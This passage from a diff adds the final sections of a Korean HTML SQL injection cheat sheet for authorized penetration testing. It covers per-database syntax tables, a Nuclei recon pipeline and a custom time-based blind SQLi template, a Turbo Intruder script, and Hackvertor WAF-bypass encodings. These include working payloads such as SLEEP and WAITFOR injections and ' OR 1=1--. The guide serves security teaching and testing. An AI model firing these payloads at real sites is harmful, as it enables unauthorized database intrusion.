+            <td>에러 내용 화면 노출</td>
+          </tr>
+          <tr>
+            <td class="pri">3</td>
+            <td class="tag-green">Boolean-Based</td>
+            <td><code>AND</code>, <code>substring()</code>, <code>ascii()</code></td>
+            <td class="tag-orange">느림</td>
+            <td>참/거짓 반응 차이</td>
+          </tr>
+          <tr>
+            <td class="pri">4</td>
+            <td class="tag-green">Time-Based</td>
+            <td><code>IF()</code>, <code>SLEEP()</code>, <code>WAITFOR</code></td>
+            <td class="tag-red">매우 느림</td>
+            <td>아무 조건 없어도 가능</td>
+          </tr>
+          <tr>
+            <td class="pri">5</td>
+            <td style="color:var(--purple)">Out-of-Band</td>
+            <td><code>LOAD_FILE</code>, <code>xp_dirtree</code>, <code>UTL_HTTP</code></td>
+            <td class="tag-orange">보통</td>
+            <td>외부 서버 통신 가능</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- DB별 빠른 비교표 -->
+    <div class="sub-section">
+      <div class="sub-title">DB별 주요 문법 비교표</div>
+      <div style="overflow-x:auto;">
+        <table class="compare-table">
+          <thead>
+            <tr><th>항목</th><th>MySQL</th><th>MSSQL</th><th>PostgreSQL</th><th>Oracle</th></tr>
+          </thead>
+          <tbody>
+            <tr><td class="pri">버전</td><td><code>@@version</code></td><td><code>@@version</code></td><td><code>version()</code></td><td><code>banner FROM v$version</code></td></tr>
+            <tr><td class="pri">현재 DB</td><td><code>database()</code></td><td><code>DB_NAME()</code></td><td><code>current_database()</code></td><td><code>SELECT name FROM v$database</code></td></tr>
+            <tr><td class="pri">현재 사용자</td><td><code>user()</code></td><td><code>user_name()</code></td><td><code>current_user</code></td><td><code>user FROM dual</code></td></tr>
+            <tr><td class="pri">문자열 연결</td><td><code>CONCAT(a,b)</code></td><td><code>a+b</code></td><td><code>a||b</code></td><td><code>a||b</code></td></tr>
+            <tr><td class="pri">주석</td><td><code>--</code> <code>#</code> <code>/**/</code></td><td><code>--</code> <code>/**/</code></td><td><code>--</code> <code>/**/</code></td><td><code>--</code> <code>/**/</code></td></tr>
+            <tr><td class="pri">결과 제한</td><td><code>LIMIT 0,1</code></td><td><code>SELECT TOP 1</code></td><td><code>LIMIT 1 OFFSET 0</code></td><td><code>WHERE ROWNUM=1</code></td></tr>
+            <tr><td class="pri">문자→ASCII</td><td><code>ascii('A')</code></td><td><code>ascii('A')</code></td><td><code>ascii('A')</code></td><td><code>ascii('A') FROM dual</code></td></tr>
+            <tr><td class="pri">ASCII→문자</td><td><code>char(65)</code></td><td><code>char(0x41)</code></td><td><code>chr(65)</code></td><td><code>chr(65) FROM dual</code></td></tr>
+            <tr><td class="pri">시간 지연</td><td><code>SLEEP(5)</code></td><td><code>WAITFOR DELAY '0:0:5'</code></td><td><code>pg_sleep(5)</code></td><td><code>DBMS_PIPE.RECEIVE_MESSAGE('a',5)</code></td></tr>
+            <tr><td class="pri">조건문</td><td><code>IF(a,b,c)</code></td><td><code>IF a THEN b ELSE c</code></td><td><code>CASE WHEN</code></td><td><code>CASE WHEN</code></td></tr>
+            <tr><td class="pri">테이블 목록</td><td><code>information_schema.tables</code></td><td><code>master..sysobjects</code></td><td><code>information_schema.tables</code></td><td><code>all_tables</code></td></tr>
+            <tr><td class="pri">더미 테이블</td><td class="tag-red">없음</td><td class="tag-red">없음</td><td class="tag-red">없음</td><td><code>FROM dual</code> 필수</td></tr>
+            <tr><td class="pri">Stacked 지원</td><td class="tag-orange">일부</td><td class="tag-green">지원</td><td class="tag-green">지원</td><td class="tag-red">미지원</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       17. Nuclei 템플릿 활용
+       ============================================================ -->
+  <section class="section-block" id="s-nuclei">
+    <div class="section-header">
+      <span class="section-num">17</span>
+      <h2 class="section-title">Nuclei 템플릿 활용</h2>
+      <span class="section-badge badge-cyan">대량 스캔</span>
+    </div>
+    <div class="section-desc">
+      sqlmap이 "1개 URL을 깊게" 판다면, Nuclei는 <strong>수백~수천 개 URL에 동일 패턴을 빠르게 스크리닝</strong>하는 용도.
+      리컨(정찰) 단계에서 넓게 훑어 후보를 추리고, 걸린 URL만 sqlmap/수동으로 깊게 파는 게 실전 순서.
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">17.1 기본 사용법 — 기존 템플릿으로 SQLi 태그 스캔</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-bash"># 템플릿 최신화 (반드시 먼저)
+nuclei -update-templates
+
+# sqli 태그가 붙은 공식 템플릿(주로 특정 제품의 알려진 CVE)만 골라 실행
+nuclei -u https://target.com -tags sqli
+
+# URL 목록 전체 대상 + 심각도 필터
+nuclei -l urls.txt -tags sqli -severity high,critical
+
+# 리컨 파이프라인과 연계 (하위도메인 → 생존확인 → 크롤링 → 파라미터 필터 → 스캔)
+subfinder -d target.com -silent | httpx -silent | katana -silent -jc | gf sqli | nuclei -t sqli-time-blind.yaml</code></pre>
+      </div>
+      <div class="info-box">
+        <span class="box-icon">ℹ</span>
+        <div><code>gf</code>(tomnomnom/gf) 자체에는 <code>sqli</code> 패턴이 기본 포함되어 있지 않다 — 별도로 패턴 저장소(예: <code>1ndianl33t/Gf-Patterns</code>)를 <code>~/.gf</code>에 내려받아야 <code>gf sqli</code> 명령이 <code>id</code>, <code>cat</code>, <code>category</code>, <code>item</code>, <code>page</code> 등 인젝션 가능성이 높은 파라미터 이름만 걸러준다 — 무작정 전체 URL을 스캔하는 것보다 신호 대비 잡음을 크게 줄여준다.</div>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">17.2 커스텀 템플릿 작성 — Time-Based Blind 자동 탐지</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        공식 SQLi 템플릿은 대부분 "특정 제품의 알려진 취약점"용이라 커스텀 앱에는 안 맞는다. 범용 탐지는 직접 짜야 한다.
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-yaml">id: custom-time-based-sqli
+
+info:
+  name: Generic Time-Based Blind SQL Injection
+  author: internal-pentest
+  severity: high
+  tags: sqli,dast,blind
+
+http:
+  - raw:
+      - |
+        GET /?{{param}}=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    fuzzing:
+      - part: query          # 쿼리스트링 파라미터 값에 대해
+        type: postfix         # 기존 값 뒤에 페이로드를 덧붙임
+        mode: single           # 파라미터 하나씩 순차 테스트
+        fuzz:
+          - "' AND SLEEP(5)-- -"
+          - "' AND SLEEP(5) AND '1'='1"
+          - " AND SLEEP(5)-- -"
+          - "; WAITFOR DELAY '0:0:5'--"
+          - "' AND pg_sleep(5)-- -"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=5"      # 응답이 5초 이상 걸리면 취약으로 판정</code></pre>
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-bash"># 작성한 템플릿 실행 (디버그 모드로 실제 요청/응답 확인)
+nuclei -u "https://target.com/items?id=1" -t custom-time-based-sqli.yaml -debug
+
+# 여러 대상에 동시 실행 + 동시성 조절 (과도한 요청으로 서버 부하 주지 않도록)
+nuclei -l urls.txt -t custom-time-based-sqli.yaml -c 10 -rate-limit 20</code></pre>
+      </div>
+      <div class="warn-box">
+        <span class="box-icon">⚠</span>
+        <div>Nuclei 버전에 따라 <code>fuzzing:</code> 블록 문법이 조금씩 바뀌었다(v3에서 도입/개선). 실행 전 <code>nuclei -version</code> 확인 후 공식 문서의 최신 fuzzing 문법과 대조할 것.</div>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">17.3 오탐 줄이기 — baseline 비교</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-yaml"># SLEEP(5) 요청과 SLEEP(0) 요청을 둘 다 보내 "정상 응답시간 대비 상대적 지연"으로 판정
+# → 원래 느린 서버/엔드포인트에서의 오탐(2.5절과 동일한 원리)을 줄임
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "' AND SLEEP(5)-- -"   # {{payload_1}}
+          - "' AND SLEEP(0)-- -"   # {{payload_2}} (baseline)
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration_1>=5 && duration_2<2"</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       18. Burp Suite 확장 활용법
+       ============================================================ -->
+  <section class="section-block" id="s-burpext">
+    <div class="section-header">
+      <span class="section-num">18</span>
+      <h2 class="section-title">Burp Suite 확장 활용법</h2>
+      <span class="section-badge badge-purple">도구</span>
+    </div>
+    <div class="section-desc">
+      BApp Store(Extender → BApp Store)에서 설치. 목적별로 골라 쓰면 수작업 시간을 크게 줄일 수 있다.
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">18.1 입력 포인트 발굴 &amp; 탐지 확장</div>
+      <table class="compare-table">
+        <thead>
+          <tr><th>확장</th><th>역할</th><th>연계 섹션</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="pri">Param Miner</td><td>URL/헤더에 안 드러난 숨은 파라미터를 브루트포스로 발견 (<code>Guess params</code> 우클릭 메뉴)</td><td>01번 입력 포인트 식별</td></tr>
+          <tr><td class="pri">Backslash Powered Scanner</td><td>알려진 페이로드 없이 문법 요소(따옴표, 백슬래시 등)에 대한 서버 반응 차이를 분석해 인젝션 가능성을 통계적으로 탐지</td><td>02번 취약점 탐지</td></tr>
+          <tr><td class="pri">Active Scan++</td><td>Burp 기본 스캐너에 Second-Order, OOB 등 추가 SQLi 탐지 로직 보강</td><td>02, 11번</td></tr>
+          <tr><td class="pri">Collaborator Everywhere v2</td><td>크롤링되는 모든 요청 헤더(X-Forwarded-For 등)에 자동으로 Collaborator 페이로드를 심어 사이트 전체를 수동 개입 없이 OOB 스캔 (기존 버전은 v2로 대체됨, BApp Store에서 v2 확인)</td><td>08번 OOB</td></tr>
+          <tr><td class="pri">Logger++</td><td>전체 트래픽에 정규식 검색 — 대량 퍼징 중 DB 에러 문자열(2.4절 패턴)이 어느 요청에서 나왔는지 한 번에 찾기</td><td>02, 05번</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">18.2 sqlmap 연동 확장</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        매번 request.txt를 저장하고 터미널로 옮기는 과정을 생략하고 Burp 안에서 바로 sqlmap을 돌리는 확장들.
+      </div>
+      <table class="compare-table">
+        <thead>
+          <tr><th>확장</th><th>사용법</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="pri">SQLiPy <span class="tag-orange">(노후화 주의)</span></td><td>요청 우클릭 → "Send to SQLiPy" → Burp 탭 안에서 sqlmap API 서버와 통신하며 옵션 지정 후 바로 실행 (15.4의 파일 저장 단계 생략). <strong>Jython 2.7~2.7.2 전용</strong>이라 최신 환경에서 설치/구동 자체가 번거로울 수 있음 — 안 되면 15.4의 request.txt 방식으로 대체.</td></tr>
+          <tr><td class="pri">Piper <span class="tag-orange">(노후화 주의)</span></td><td>요청/응답을 외부 커맨드라인 도구로 파이프 — sqlmap뿐 아니라 자체 Python 스크립트(6.8절)도 Burp 안에서 바로 실행 가능하도록 연결. BApp Store 기준 마지막 업데이트가 오래돼(2020년) 최신 Burp 버전과의 호환성을 설치 전 반드시 확인할 것.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">18.3 Turbo Intruder — 고속 커스텀 Blind 추출</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        기본 Intruder보다 훨씬 빠르고, Python으로 요청 로직을 직접 제어할 수 있어 6.8절 자동화 스크립트를 <strong>Burp 세션/쿠키를 그대로 재사용하면서</strong> 돌릴 때 유용하다.
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-python">def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=5,
+                            requestsPerConnection=10,
+                            pipeline=False)
+
+    # Time-Based Blind 확인용: 정상 요청과 SLEEP 요청을 함께 큐잉해 응답시간 비교
+    engine.queue(target.req, "1")
+    engine.queue(target.req, "1' AND SLEEP(5)-- -")
+
+def handleResponse(req, interesting):
+    # req.time(응답시간)이 임계값 이상이면 취약 후보로 표시
+    table.add(req)</code></pre>
+      </div>
+      <div class="tip-box">
+        <span class="box-icon">💡</span>
+        Turbo Intruder는 <code>%s</code> 마커 위치에 <code>engine.queue()</code>로 넘긴 값을 그대로 치환한다 — Repeater에서 페이로드 위치에 <code>%s</code>를 표시한 뒤 Turbo Intruder로 넘기면 됨.
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">18.4 Hackvertor — WAF 우회 인코딩 보조</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        12번 섹션의 인코딩 우회(16진수, CHAR(), 이중 URL 인코딩 등)를 매번 손으로 변환하지 않고, 태그로 감싸면 자동 변환해준다.
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-text">-- Repeater에서 페이로드를 태그로 감싸면 전송 시 자동 인코딩됨
+&lt;@hex&gt;SELECT username FROM users&lt;/@hex&gt;
+&lt;@url_encode&gt;' OR 1=1--&lt;/@url_encode&gt;
+&lt;@url_encode&gt;&lt;@url_encode&gt;' OR 1=1--&lt;/@url_encode&gt;&lt;/@url_encode&gt;   -- 이중 인코딩 (12.3절)</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- 푸터 -->
+  <footer style="margin-top:60px; padding-top:24px; border-top:1px solid var(--border); font-size:12px; color:var(--text-mute);">
+    <div style="margin-bottom:6px;">출처 / References</div>
+    <div style="display:flex; gap:16px; flex-wrap:wrap;">
+      <a href="https://pentestmonkey.net/category/cheat-sheet/sql-injection" target="_blank" style="color:var(--cyan); text-decoration:none;">pentestmonkey.net</a>
+      <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" style="color:var(--cyan); text-decoration:none;">PortSwigger Web Security Academy</a>
+      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md" target="_blank" style="color:var(--cyan); text-decoration:none;">PayloadsAllTheThings</a>
+      <a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" style="color:var(--cyan); text-decoration:none;">Invicti SQLi Cheat Sheet</a>
+    </div>
+    <div style="margin-top:12px; color:var(--text-mute);">
+      이 문서는 교육 및 인가된 모의해킹 목적으로만 사용하십시오. 2026년 7월 기준.
+    </div>
+  </footer>
+
+</main><!-- /#main -->
+
+<!-- ============================================================
+     JavaScript — 스크롤 스파이 / 복사 버튼 / 검색 / 모바일 메뉴
+     ============================================================ -->
+<script>
+  // ── 1. highlight.js 초기화 ──────────────────────────────────
+  // 페이지 로드 후 모든 <pre><code> 블록에 구문 강조 적용
+  document.addEventListener('DOMContentLoaded', function() {
+    document.querySelectorAll('pre code').forEach(function(block) {
+      hljs.highlightElement(block);
+    });
+  });
+
+  // ── 2. 코드 복사 버튼 ────────────────────────────────────────
+  // 각 복사 버튼에서 가장 가까운 pre 태그의 텍스트를 클립보드에 복사
+  function copyCode(btn) {
+    const pre = btn.nextElementSibling; // copy-btn 다음 형제인 <pre>
+    const text = pre ? pre.innerText : '';
+    navigator.clipboard.writeText(text).then(function() {
+      btn.textContent = '✓ 복사됨';
+      btn.classList.add('copied');
+      setTimeout(function() {
+        btn.textContent = '복사';
+        btn.classList.remove('copied');
+      }, 2000);
+    }).catch(function() {
+      // clipboard API 실패 시 fallback
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      btn.textContent = '✓ 복사됨';
+      btn.classList.add('copied');
+      setTimeout(function() { btn.textContent = '복사'; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+
+  // ── 3. 스크롤 스파이 — 현재 보이는 섹션 사이드바에서 활성화 ──
+  // IntersectionObserver로 화면에 보이는 섹션을 감지하여 nav 링크 활성화
+  (function() {
+    const navLinks = document.querySelectorAll('.nav-link');
+    const sections = document.querySelectorAll('.section-block');
+
+    // rootMargin 조정: 상단 50px 들어온 시점부터 활성화
+    const observer = new IntersectionObserver(function(entries) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          const id = entry.target.id;
+          navLinks.forEach(function(link) {
+            if (link.getAttribute('href') === '#' + id) {
+              link.classList.add('active');
+            } else {
+              link.classList.remove('active');
+            }
+          });
+        }
+      });
+    }, { rootMargin: '-50px 0px -60% 0px' });
+
+    sections.forEach(function(sec) { observer.observe(sec); });
+  })();
+
+  // ── 4. 검색 필터 — 섹션 제목/내용 기반 실시간 필터링 ──────────
+  // 검색어가 섹션 제목이나 코드에 포함되지 않으면 해당 섹션 숨김
+  document.getElementById('search-input').addEventListener('input', function() {
+    const query = this.value.toLowerCase().trim();
+    const sections = document.querySelectorAll('.section-block');
+
+    sections.forEach(function(sec) {
+      if (!query) {
+        // 검색어 없으면 전체 표시
+        sec.classList.remove('hidden');
+      } else {
+        const text = sec.innerText.toLowerCase();
+        sec.classList.toggle('hidden', !text.includes(query));
+      }
+    });
+  });
+
+  // ── 5. 맨 위로 버튼 — 300px 이상 스크롤 시 표시 ─────────────
+  const backBtn = document.getElementById('back-to-top');
+  window.addEventListener('scroll', function() {
+    backBtn.classList.toggle('visible', window.scrollY > 300);
+  });
+
+  // ── 6. 모바일 메뉴 토글 ───────────────────────────────────────
+  function toggleSidebar() {
+    document.getElementById('sidebar').classList.toggle('open');
+  }
+  // 사이드바 외부 클릭 시 닫기 (모바일)
+  document.addEventListener('click', function(e) {
+    const sidebar = document.getElementById('sidebar');
+    const menuBtn = document.getElementById('mobile-menu-btn');
+    if (sidebar.classList.contains('open') &&
+        !sidebar.contains(e.target) &&
+        e.target !== menuBtn) {
+      sidebar.classList.remove('open');
+    }
+  });
+</script>
+
+</body>
+</html>
